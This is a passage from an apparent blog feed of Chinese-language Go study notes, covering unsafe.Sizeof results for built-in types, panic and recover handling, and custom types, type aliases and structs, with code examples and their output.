class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">"切片的长度："</span>, <span class="built_in">len</span>(nums)) <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> nums &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"v = "</span>, v) <span class="comment">// [1, 2, 5, 7, 9, 11]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"切片的总大小是："</span>, unsafe.Sizeof(nums)) <span class="comment">// 24</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mapFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;</span><br><span class="line"><span class="string">"yumi"</span>: <span class="number">23</span>,</span><br><span class="line"><span class="string">"amy"</span>:  <span class="number">19</span>,</span><br><span class="line"><span class="string">"lucy"</span>: <span class="number">22</span>,</span><br><span class="line"><span class="string">"ben"</span>:  <span class="number">24</span>,</span><br><span class="line"><span class="string">"may"</span>:  <span class="number">28</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"map 的长度："</span>, <span class="built_in">len</span>(m)) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"k = "</span>, k) <span class="comment">// yumi、amy、lucy、ben、amy</span></span><br><span class="line"><span class="built_in">println</span>(<span class="string">"v = "</span>, v) <span class="comment">// 23、19、22、24、28</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"map 的总大小是："</span>, unsafe.Sizeof(m)) <span class="comment">// 8</span></span><br><span class="line">fmt.Println(<span class="string">"------------------------"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">arrayFunc()</span><br><span class="line"></span><br><span class="line">sliceFunc()</span><br><span class="line"></span><br><span class="line">stringFunc()</span><br><span class="line"></span><br><span class="line">mapFunc()</span><br><span class="line"></span><br><span class="line">structFunc()</span><br><span class="line"></span><br><span class="line">interfaceFunc()</span><br><span class="line"></span><br><span class="line">pointerFunc()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行之后，得到的输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">数组的长度： <span class="number">4</span></span><br><span class="line">v =  <span class="number">0</span></span><br><span class="line">v =  <span class="number">2</span></span><br><span class="line">v =  <span class="number">0</span></span><br><span class="line">v =  <span class="number">4</span></span><br><span class="line">数组的总大小是： <span class="number">32</span></span><br><span class="line">------------------------</span><br><span class="line">切片的长度： <span class="number">6</span></span><br><span class="line">v =  <span class="number">1</span></span><br><span class="line">v =  <span class="number">3</span></span><br><span class="line">v =  <span class="number">5</span></span><br><span class="line">v =  <span class="number">7</span></span><br><span class="line">v =  <span class="number">9</span></span><br><span class="line">v =  <span class="number">11</span></span><br><span class="line">切片的总大小是： <span class="number">24</span></span><br><span class="line">------------------------</span><br><span class="line"><span class="keyword">string</span> 的长度： <span class="number">21</span></span><br><span class="line">v = 这 </span><br><span class="line">v = 句 </span><br><span class="line">v = 话 </span><br><span class="line">v = 共 </span><br><span class="line">v = 七 </span><br><span class="line">v = 个 </span><br><span class="line">v = 字 </span><br><span class="line"><span class="keyword">string</span> 的总大小是： <span class="number">16</span></span><br><span class="line">------------------------</span><br><span class="line"><span class="keyword">map</span> 的长度： <span class="number">5</span></span><br><span class="line">k =  may</span><br><span class="line">v =  <span class="number">28</span></span><br><span class="line">k =  yumi</span><br><span class="line">v =  <span class="number">23</span></span><br><span class="line">k =  amy</span><br><span class="line">v =  <span class="number">19</span></span><br><span class="line">k =  lucy</span><br><span class="line">v =  <span class="number">22</span></span><br><span class="line">k =  ben</span><br><span class="line">v =  <span class="number">24</span></span><br><span class="line"><span class="keyword">map</span> 的总大小是： <span class="number">8</span></span><br><span class="line">------------------------</span><br><span class="line">空结构体的总大小是： <span class="number">0</span></span><br><span class="line">初始化结构体的总大小是： <span class="number">32</span></span><br><span class="line">零值初始化的结构体的总大小是： <span class="number">32</span></span><br><span class="line">------------------------</span><br><span class="line">空接口的总大小是： <span class="number">16</span></span><br><span class="line">接口的总大小是： <span class="number">16</span></span><br><span class="line">------------------------</span><br><span class="line">空指针的总大小是： <span class="number">8</span></span><br><span class="line">整型指针的总大小是： <span class="number">8</span></span><br><span class="line"><span class="keyword">string</span> 指针的总大小是： <span class="number">8</span></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure><p>会不会有些意外？</p><p>切片、string、map 的总大小怎么有点奇怪？怎么是 24、16 和 8？</p><h2 id="sizeof"><a href="#sizeof" class="headerlink" title="sizeof"></a>sizeof</h2><p>回答这个问题之前，先来看看 <code>unsafe.sizeof</code> 这个函数的定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/unsafe/unsafe.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sizeof takes an expression x of any type and returns the size in bytes</span></span><br><span class="line"><span class="comment">// of a hypothetical variable v as if v was declared via var v = x.</span></span><br><span class="line"><span class="comment">// The size does not include any memory possibly referenced by x.</span></span><br><span class="line"><span class="comment">// For instance, if x is a slice, Sizeof returns the size of the slice</span></span><br><span class="line"><span class="comment">// descriptor, not the size of the memory referenced by the slice.</span></span><br><span class="line"><span class="comment">// The return value of Sizeof is a Go constant.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sizeof</span><span class="params">(x ArbitraryType)</span> <span class="title">uintptr</span></span></span><br></pre></td></tr></table></figure><p>大意就是：Sizeof 接受任何类型的表达式 x，并返回一个假设变量 v 的字节大小，就好像 v 是通过 var v=x 声明的，该大小不包括 x 可能引用的任何内存。<br>例如，如果 x 是一个切片，Sizeof 返回<strong>切片描述符的大小，而不是切片引用的内存大小</strong>。</p><p>什么是描述符呢？<br>以切片为例，就是它本身并不真正存储字符串数据，而仅是由一个<strong>指向底层存储的指针</strong>、<strong>切片长度</strong>和<strong>切片最大容量</strong>组成。</p><p>看到这里会不会清晰一些，有没有想起什么，没错，切片的数据结构刚好是由这三部分组成：</p><ul><li>array：指向底层数组的指针，类型为 uintptr，占用八个字节</li><li>len：切片的长度，类型为 int，占用八个字节</li><li>cap：切片的最大容量，类型为 int，占用八个字节</li></ul><p>所以，在上面的示例代码中，切片变量的总大小就是 <code>8 + 8 + 8 = 24</code> 个字节。</p><p>string 类型也是一样的分析方式，它的描述符是由一个<strong>指向底层存储的指针</strong>和<strong>字符串的长度</strong>组成。</p><p>string 的数据结构：</p><ul><li>Data：指向底层存储的指针，类型为 uintptr，占用八个字节</li><li>Len：字符串的长度，类型为 int，占用八个字节</li></ul><p>string 变量的总大小就是 <code>8 + 8 = 16</code> 个字节。</p><p>结构体作为直接存储自身数据的类型，它和数组又有所不同，这是因为结构体是由若干个字段（field）聚合而成，每个字段都有自己的类型，所以结构体占用内存大小取决于组成结构体的各字段大小之和。</p><p>还是上面的示例代码，Person 结构体是由一个 string 类型、两个 int 类型组成，所以它占用的内存大小是 <code>16 + 8 + 8 = 32</code> 个字节。</p><p>注意，这里的string 就是上面的 string ，所以是 16 个字节。</p><p>因为空结构体中没有字段，所以总大小是零。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于整型、数组、结构体这类类型，它们的内存表示就是它们自身的数据内容，所以计算占用内存大小时，就是组成它们数据本身的大小。</p><p>而对于切片、string、map 等类型来说，它们的内存表示则是它们数据内容的“描述符”，所以计算占用内存大小时，需要以描述符的大小为准。</p><p>前者作为函数参数传递时，常被提到有性能开销，而后者则没有，也正是这个原因。</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——panic</title>
      <link href="/go-language-study-notes-panic/"/>
      <url>/go-language-study-notes-panic/</url>
      
        <content type="html"><![CDATA[<p>Go 函数的健壮性设计包括很多方面，首先是最基本的“三不要”原则，简单来了解一下。</p><a id="more"></a><h2 id="三不要原则"><a href="#三不要原则" class="headerlink" title="三不要原则"></a>三不要原则</h2><h3 id="不要相信任何外部输入的参数"><a href="#不要相信任何外部输入的参数" class="headerlink" title="不要相信任何外部输入的参数"></a>不要相信任何外部输入的参数</h3><p>函数的使用者可能是任何人，这些人在使用函数之前可能都没有阅读过任何手册或文档，他们会向函数传入你意想不到的参数。因此，为了保证函数的健壮性，函数需要对所有输入的参数进行合法性的检查。</p><p>一旦发现问题，立即终止函数的执行，返回预设的错误值。</p><h3 id="不要忽略任何一个错误"><a href="#不要忽略任何一个错误" class="headerlink" title="不要忽略任何一个错误"></a>不要忽略任何一个错误</h3><p>在函数实现中，通常会调用标准库或第三方包提供的函数或方法。对于这些调用，不能假定它一定会成功，一定要显式地检查这些调用返回的错误值。</p><p>一旦发现错误，要及时终止函数执行，防止错误继续传播。</p><h3 id="不要假定异常不会发生"><a href="#不要假定异常不会发生" class="headerlink" title="不要假定异常不会发生"></a>不要假定异常不会发生</h3><p>先要确定一个认知：<strong>异常不是错误</strong>。</p><p>错误是可预期的，也是经常会发生的，有对应的公开错误码和错误处理预案，但异常却是少见的、意料之外的。通常意义上的异常，指的是硬件异常、操作系统异常、语言运行时异常，还有更大可能是代码中潜在 bug 导致的异常，比如代码中出现了以 0 作为分母，或者是数组越界访问等情况。</p><p>虽然异常发生是“小众事件”，但是不能假定异常就不会发生。</p><h2 id="panic"><a href="#panic" class="headerlink" title="panic"></a>panic</h2><p>不同编程语言表示异常（Exception）这个概念的语法都不相同，在 Go 语言中，异常这个概念由 panic 表示。</p><p>panic 指的是 Go 程序在运行时出现的一个异常情况。如果异常出现了，但没有被捕获并恢复，Go 程序的执行就会被终止，即便出现异常的位置不在主 Goroutine 中也会这样。</p><p>在 Go 中，panic 主要有两类来源，一类是来自 <strong>Go 运行时</strong>，另一类则是 Go 开发人员通过 <strong>panic 函数主动触发的</strong>。<br>无论是哪种，一旦 panic 被触发，后续 Go 程序的执行过程都是一样的，这个过程被 Go 语言称为 <strong>panicking</strong>。</p><p>下面用一个例子来直观感受一下 panicking 这个过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"call foo"</span>)</span><br><span class="line">bar()</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"exit foo"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bar</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"call bar"</span>)</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"panic occurs in bar"</span>)</span><br><span class="line">zoo()</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"exit bar"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">zoo</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"call zoo"</span>)</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"exit zoo"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"call main"</span>)</span><br><span class="line">foo()</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"exit main"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例中，从 main 函数开始，函数的调用次序依次为 <code>main</code> -&gt; <code>foo</code> -&gt; <code>bar</code> -&gt; <code>zoo</code>。在 bar 函数中，调用 panic 函数手动触发了 panic。</p><p>最终程序的输出结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call main</span><br><span class="line">call foo</span><br><span class="line">call bar</span><br><span class="line">panic: panic occurs in bar</span><br></pre></td></tr></table></figure><p>下面用一张图来解释程序的调用过程：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221106220207.png" alt=""></p><p>关键部分有两处：</p><ol><li>在 bar 函数中，代码在执行下一个函数之前调用了 panic 函数触发了异常，所以 bar 函数的执行就此停住了，panicking 过程就此开始</li><li>因为没有捕获 panic，所以 panic 会沿着函数调用栈一直向下走，从 foo/main 这些函数的视角来看，对 bar/foo 函数的调用，和对 panic 函数的调用是一样的，因为都没有捕捉 panic，所以调用完 panic 之后，自身的执行就此停止了，已经执行完成的函数会依次从栈顶弹出，最后main 函数也 exit 了</li></ol><p>不过，Go 也提供了捕捉 panic 并恢复程序正常执行秩序的方法，我们可以通过 <code>recover</code> 函数来实现这一点。</p><p>用上面这个例子分析，在触发 panic 的 bar 函数中，对 panic 进行捕捉并恢复，直接来看恢复后，整个程序的执行情况是什么样的（除了 bar 函数调整了，其他函数均没有改变）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bar</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> e := <span class="built_in">recover</span>(); e != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">"recover the panic:"</span>, e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"call bar"</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">"panic occurs in bar"</span>)</span><br><span class="line">    zoo()</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"exit bar"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在更新版的 bar 函数中，通过 defer 匿名函数中调用 recover 函数对 panic 进行了捕获：</p><ul><li>如果捕获到，panic 引发的 panicking 过程就会停止，并返回以 panic 的具体内容为错误上下文信息的错误值</li><li>如果没有 panic 发生，那么 recover 将返回 nil</li></ul><p>执行更新后的程序，得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call main</span><br><span class="line">call foo</span><br><span class="line">call bar</span><br><span class="line">recover the panic: panic occurs in bar</span><br><span class="line">exit foo</span><br><span class="line">exit main</span><br></pre></td></tr></table></figure><p>调用过程如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221106221146.png" alt=""></p><p>可以看到，此时 main 函数是正常执行完退出的，因为使用了 recover 顺利捕获到了 panic。</p><p>面对有如此行为特点的 panic，那么到底该如何使用呢？是不是在所有 Go 函数或方法中，都要用 defer 函数来捕捉和恢复 panic 呢？</p><h2 id="如何应对-panic"><a href="#如何应对-panic" class="headerlink" title="如何应对 panic"></a>如何应对 panic</h2><p>其实不用，原因有两点：</p><ol><li>大量的 panic 会徒增开发人员实现函数时的心智负担</li><li>很多函数非常简单，根本不会出现 panic 情况，增加 panic 捕获和恢复，反倒会增加函数的复杂性。同时，defer 函数会带来一定性能开销</li></ol><p>下面提供三点经验，可以参考一下。</p><h3 id="评估-panic-等级"><a href="#评估-panic-等级" class="headerlink" title="评估 panic 等级"></a>评估 panic 等级</h3><p>首先，应该知道一个事实：<strong>不同应用对异常引起的程序崩溃退出的忍受度是不一样的。</strong></p><p>比如，一个单次运行于控制台窗口中的命令行交互类程序（CLI），和一个常驻内存的后端 HTTP 服务器程序，前者即便因异常崩溃，对用户来说也仅仅是再重新运行一次而已。但后者一旦崩溃，就很可能导致整个网站停止服务。</p><p>所以针对各种应用对 panic 忍受度的差异，应该采取的 panic 的策略也是不同的。</p><p>像后端 HTTP 服务器程序这样的任务关键系统，就需要在特定的位置捕获并恢复 panic，以保证服务器整体的健壮度。</p><h3 id="提示潜在-bug"><a href="#提示潜在-bug" class="headerlink" title="提示潜在 bug"></a>提示潜在 bug</h3><p>当一些本不该发生的事情导致程序异常结束时，可以使用 panic 充当类似断言的作用。</p><p>在 json 包的 <code>encode.go</code> 中也有使用 panic 充当断言的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/encoding/json/encode.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *reflectWithString)</span> <span class="title">resolve</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="keyword">switch</span> w.k.Kind() &#123;</span><br><span class="line">    <span class="keyword">case</span> reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:</span><br><span class="line">        w.ks = strconv.FormatInt(w.k.Int(), <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">case</span> reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:</span><br><span class="line">        w.ks = strconv.FormatUint(w.k.Uint(), <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">"unexpected map key type"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中，resolve 方法的最后一行代码就相当于一个“代码逻辑不会走到这里”的断言。一旦触发“断言”，这很可能就是一个潜在 bug。</p><p>去掉 panic 这行代码并不会对程序造成影响，但是如果存在的话，当问题出现时，就可以借助 panic 作为断言快速定位到问题所在。</p><h3 id="不要混淆异常与错误"><a href="#不要混淆异常与错误" class="headerlink" title="不要混淆异常与错误"></a>不要混淆异常与错误</h3><p>在 Go 中，通常会导入大量第三方包，而对于这些第三方包 API 中是否会引发panic，调用者是不知道的。</p><p>因此上层代码，也就是 API 调用者根本不会去逐一了解 API 是否会引发panic，也没有义务去处理引发的 panic。因此，在 Go 中，API 的提供者，一定不要将 panic 当作错误返回给 API 调用者。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>错误是 error，异常是 panic，两者是有本质区别的</li><li>defer 要在panic 之前，才能执行</li><li>recover 只能在defer 中调用才能生效</li><li>defer 内部的recover 只能捕获当前协程的Panic，不能跨协程执行</li><li>无论在哪个 Goroutine 中发生未被恢复的 panic，整个程序都将崩溃退出</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——结构体</title>
      <link href="/go-language-study-notes-struct/"/>
      <url>/go-language-study-notes-struct/</url>
      
        <content type="html"><![CDATA[<p>Go 语言并不是一门面向对象的编程语言，它没有面向对象所特有的 class，在 Go 语言中，对事物进行抽象使用结构体类型 struct。</p><a id="more"></a><p>不过，在学习如何定义一个结构体类型之前，首先要来看看如何在 Go 中自定义一个新类型。</p><h2 id="自定义新类型"><a href="#自定义新类型" class="headerlink" title="自定义新类型"></a>自定义新类型</h2><p>在 Go 中，自定义一个新类型一般有两种方法，下面一一介绍。</p><h3 id="type"><a href="#type" class="headerlink" title="type"></a>type</h3><p>使用类型声明语法（Type 关键字），这也是最常用的方式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T S <span class="comment">// 基于类型 S 定义一个新类型T</span></span><br></pre></td></tr></table></figure><p>Go 语言中，凡通过类型声明语法声明的类型都被称为 defined 类型。</p><p>在这里，S 可以是任何一个已定义的类型，包括 <strong>Go 原生类型</strong>，或者是<strong>其他已定义的自定义类型</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T1 <span class="keyword">int</span></span><br><span class="line"><span class="keyword">type</span> T2 T1</span><br></pre></td></tr></table></figure><p>在上面的示例代码中，新类型 T1 是基于 Go 原生类型 int 定义的新自定义类型，而新类型 T2 则是基于刚刚定义的类型 T1，定义的新类型。</p><p>这里引入一个概念：<strong>底层类型（Underlying Type）</strong>—— 如果一个新类型是基于某个 Go 原生类型或者其他已定义的自定义类型定义的，那么就可以说 Go 原生类型/其他已定义的自定义类型是新类型的底层类型。</p><p>底层类型在 Go 语言中有重要作用，<strong>它被用来判断两个类型本质上是否相同（Identical）。</strong></p><p>在上面例子中，虽然 T1 和 T2 是不同类型，但因为它们的底层类型都是类型 int，所以它们在本质上是相同的。</p><p>而本质上相同的两个类型，它们的变量可以通过显式转型进行相互赋值，相反，如果本质上是不同的两个类型，它们的变量间连显式转型都不可能，更不要说相互赋值了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T1 <span class="keyword">int</span></span><br><span class="line"><span class="keyword">type</span> T2 T1</span><br><span class="line"><span class="keyword">type</span> T3 <span class="keyword">string</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> n1 T1</span><br><span class="line">    <span class="keyword">var</span> n2 T2 = <span class="number">5</span></span><br><span class="line">    n1 = T1(n2)  <span class="comment">// ok</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> s T3 = <span class="string">"hello"</span></span><br><span class="line">    n1 = T1(s) <span class="comment">// 错误：cannot convert s (type T3) to type T1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了基于已有类型定义新类型之外，还可以基于<strong>类型字面值</strong>来定义新类型，这种方式多用于自定义一个新的复合类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> M <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>     <span class="comment">// 定义一个 [int]string 类型的 map</span></span><br><span class="line"><span class="keyword">type</span> S []<span class="keyword">string</span>           <span class="comment">// 定义一个 切片类型的新类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以写成这样</span></span><br><span class="line"><span class="keyword">type</span> (</span><br><span class="line">M <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span></span><br><span class="line">S []<span class="keyword">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="type-alias"><a href="#type-alias" class="headerlink" title="type alias"></a>type alias</h3><p>第二种方式是使用类型别名（Type Alias）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T = S <span class="comment">// type alias</span></span><br></pre></td></tr></table></figure><p>与前面的第一种自定义新类型的方式相比，类型别名在形式上多出了一个等号，其次就是新类型 T 和原类型 S 是完全等价的，完全等价的意思就是，类型别名并没有定义出新类型，类 T 与 S 实际上就是<strong>同一种类型</strong>。</p><p>通过下面这段示例代码来验证：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T = <span class="keyword">string</span> </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> s <span class="keyword">string</span> = <span class="string">"hello"</span> </span><br><span class="line"><span class="keyword">var</span> t T = s <span class="comment">// ok</span></span><br><span class="line">fmt.Printf(<span class="string">"%T\n"</span>, t) <span class="comment">// string</span></span><br></pre></td></tr></table></figure><p>类型 T 是通过类型别名的方式定义的，T 与 string 实际上是一个类型，所以这里，使用 string 类型变量 s 给 T 类型变量 t 赋值的动作，实质上就是<strong>同类型赋值</strong>。最后输出的 string 也是符合预期的。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>复合类型的定义一般都是通过<strong>类型字面值</strong>的方式来进行的，作为复合类型之一的结构体类型也不例外：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个名称为 T 的结构体类型</span></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    Field1 T1</span><br><span class="line">    Field2 T2</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    FieldN Tn</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类型字面值由若干个字段（field）聚合而成，每个字段有自己的名称与类型，且每个字段的名称是唯一的。</p><p>另外，这个名称为 T 的结构体，因为首字母是大写的关系，它是带有导出标识符的，所以在其他包中也可以被访问到，反之，如果是小写，则只能在当前包中使用。结构体中的字段也遵循这个规则。</p><p>除了上面这种典型的定义方式，还有几种特殊的情况。</p><h3 id="空结构体"><a href="#空结构体" class="headerlink" title="空结构体"></a>空结构体</h3><p>可以定义一个空结构体，也就是没有包含任何字段的结构体类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Empty <span class="keyword">struct</span>&#123;&#125; <span class="comment">// Empty是一个不包含任何字段的空结构体类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e Empty</span><br><span class="line"><span class="comment">// 查看变量内存占用大小</span></span><br><span class="line"><span class="built_in">println</span>(unsafe.Sizeof(e)) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>因为空结构体类型变量的内存占用为 0，基于空结构体类型内存零开销这样的特性，可以作为“事件”信息进行 Goroutine 